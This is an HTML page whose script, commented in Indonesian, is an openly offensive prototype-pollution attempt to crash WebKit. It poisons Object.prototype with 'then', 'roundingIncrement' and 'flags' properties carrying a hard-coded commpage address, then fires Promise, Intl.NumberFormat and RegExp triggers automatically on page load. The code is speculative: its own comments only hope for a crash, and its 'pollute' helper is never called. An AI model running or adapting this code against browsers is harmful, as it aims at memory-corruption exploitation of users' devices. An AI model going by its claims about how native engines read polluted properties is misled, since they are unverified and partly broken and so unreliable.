<!DOCTYPE html>
<html>
<head>
    <title>Prototype Pollution to Native Crash</title>
</head>
<body>

    <h1>Prototype Pollution Gadget</h1>
    <p>Target: 0x0000000FFFFFC320</p>
    <div id="status">INIT: Menyuntikkan Racun Prototype...</div>
    <div id="log-area" style="border:1px solid #ccc; height:300px; overflow:scroll; font-family:monospace;"></div>

    <script>
        // --- TARGET CONSTANTS ---
        const COMM_PAGE_TARGET = BigInt("0x0000000FFFFFC320");
        const TARGET_VAL = Number(COMM_PAGE_TARGET & 0xFFFFFFFFn); // 32-bit slice

        const logger = document.getElementById('log-area');
        function log(msg) {
            logger.innerHTML += `<div>[${performance.now().toFixed(0)}] ${msg}</div>`;
        }

        // --- 1. FUNGSI POLLUTION ---
        // Fungsi recursive merge yang sengaja dibuat rentan untuk mencemari __proto__
        function pollute(target, source) {
            for (let key in source) {
                if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
                    // Ini adalah celahnya. Kita membiarkan polusi terjadi pada Object.prototype
                    Object.prototype[source[key].name] = source[key].value;
                }
            }
        }

        // --- 2. PAYLOAD RACUN ---
        // Kita akan mencemari properti yang sering digunakan C++ secara internal.
        // Properti seperti 'then', 'length', 'size', 'buffer', 'handle' sering diintip oleh C++.
        
        const poisonPayload = {
            "__proto__": {
                name: "then", // Menargetkan Promise logic di C++
                value: TARGET_VAL 
            }
        };
        
        const poisonPayload2 = {
             "__proto__": {
                name: "roundingIncrement", // Menargetkan Intl.NumberFormat di C++
                value: { 
                    valueOf: () => { 
                        log("‚ö†Ô∏è C++ mengakses roundingIncrement!"); 
                        return TARGET_VAL; 
                    }
                }
            }
        };

        // --- 3. EKSEKUSI ---
        function runSilentAttack() {
            log("üíâ Phase 1: Menyuntikkan Polusi ke Object.prototype...");
            
            // Lakukan polusi
            try {
                // Polusi 1: 'then' property (Sangat berbahaya untuk Promise native)
                Object.prototype.then = TARGET_VAL; 
                log("Polusi 'then' berhasil disuntikkan.");

                // Polusi 2: Gadget spesifik Intl (Internationalization)
                // Intl sering memiliki parser C++ yang kompleks
                Object.defineProperty(Object.prototype, 'roundingIncrement', {
                    get: function() {
                        log("üî• TRIGGER: WebKit C++ membaca properti terpolusi!");
                        return 0x0000000FFFFFC320n; // Mengembalikan BigInt Commpage
                        // Kita berharap C++ mencoba mengonversi ini menjadi pointer/integer dan crash
                    }
                });
                
            } catch(e) {
                log("Error saat polusi: " + e.message);
            }

            log("‚è≥ Phase 2: Memicu Native Code Paths...");

            // Trigger A: Promise Internal Confusion
            // C++ Microtask queue mungkin bingung karena semua objek sekarang punya 'then'
            Promise.resolve('test').catch(e => {});

            // Trigger B: Intl.NumberFormat (Target Utama)
            // Fitur ini membaca banyak opsi dari prototype jika tidak disediakan.
            try {
                // Kita membuat formatter tanpa opsi, memaksanya melihat ke prototype
                const formatter = new Intl.NumberFormat('en-US', { style: 'percent' });
                
                // Paksa pemformatan angka aneh untuk memicu logic path C++
                formatter.format(123.456);
                
                log("Intl trigger selesai. Jika tidak crash, coba refresh.");
            } catch (e) {
                log("Intl Error: " + e.message);
            }
            
            // Trigger C: RegExp Compilation
            // RegExp engine juga membaca properti 'exec', 'flags', dll.
            try {
                Object.prototype.flags = {
                    toString: () => { 
                        log("‚ö†Ô∏è RegExp mengakses flags!"); 
                        return "g"; // Normal return
                    }
                };
                let r = /abc/;
                r.exec("abc");
            } catch(e) {}
        }

        setTimeout(runSilentAttack, 1000);

    </script>
</body>
</html>
